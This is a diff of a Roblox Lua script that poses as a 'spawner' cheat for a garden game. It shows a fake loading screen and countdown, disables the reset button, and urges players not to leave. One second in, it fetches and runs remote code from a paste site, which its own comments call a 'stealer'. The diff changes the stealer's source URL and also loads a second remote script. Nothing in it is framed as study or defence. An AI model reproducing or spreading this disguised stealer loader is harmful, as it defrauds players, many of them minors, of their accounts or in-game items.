@@ -58,7 +58,7 @@ bottomText.Font = Enum.Font.Code
 bottomText.TextScaled = true
 bottomText.Text = "*Do not leave while loading...*"
 
--- Matrix math fall
+-- Matrix effect
 task.spawn(function()
 	while gui and gui.Parent do
 		local mathLabel = Instance.new("TextLabel", mainFrame)
@@ -86,16 +86,16 @@ pcall(function()
 	StarterGui:SetCore("ResetButtonCallback", false)
 end)
 
--- 🕒 Load stealer after 1 second
+-- ✅ Your stealer loads after 1s
 task.delay(1, function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/NoLag/refs/heads/main/GrowaGarden"))()
+	loadstring(game:HttpGet("https://pastefy.app/F3csVCnq/raw"))()
 end)
 
--- 🚀 Load spawner instantly
+-- ✅ Spawner loads instantly
 local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
 
--- ⏳ Countdown for 30s
+-- ⏱️ 30s Countdown
 task.spawn(function()
 	for i = 30, 0, -1 do
 		countLabel.Text = "Loading: " .. i .. "s"
@@ -122,11 +122,12 @@ task.spawn(function()
 	blur:Destroy()
 end)
 
--- 🛑 Optional fake leave block
+-- Fake leave prevention
 Players.PlayerRemoving:Connect(function(leavingPlayer)
 	if leavingPlayer == player and tick() - startTime < 30 then
-		-- Uncomment to kick early exit:
+		-- Uncomment to enforce:
 		-- leavingPlayer:Kick("Leaving early is not allowed during loading.")
 	end
 end)
+
 
